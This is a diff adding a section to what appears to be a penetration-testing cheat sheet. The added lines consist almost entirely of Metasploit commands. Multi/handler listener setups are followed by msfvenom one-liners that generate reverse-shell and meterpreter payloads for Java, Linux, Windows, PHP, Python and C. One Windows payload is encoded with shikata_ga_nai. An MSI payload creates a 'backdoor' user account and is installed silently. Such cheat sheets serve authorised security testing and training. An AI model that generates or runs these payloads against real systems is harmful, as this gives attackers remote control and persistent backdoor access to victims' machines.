@@ -40,6 +40,49 @@ python -c 'print("A" * 5000)' | nc <ip> <port>
 
 #upgrade shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#MSFVENOM
+
+#MULTIHANDLER
+msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
+
+./msfconsole -q
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.123
+lhost => 192.168.1.123
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > run
+
+#java
+msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war
+
+#linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf
+
+#windows
+msfvenom -p windows/meterpreter/reverse_https LHOST=172.28.23.16 LPORT=443 -e x86/shikata_ga_nai -i 5 -f dll > shellcode.dll
+
+#php
+msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.1.43 lport=4050 > /var/www/shell.txt
+
+#python
+msfvenom -p python/meterpreter/reverse_tcp LHOST = ANYIP LPORT= ANY PORT R> anyname.py
+
+#c++
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > meterpreter.c
+
+#msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
+
+#reverse-shell x64 windows
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=8888 -f c -b \x00\x0a\x0d
+
+
 ```
 
 PRIVESC
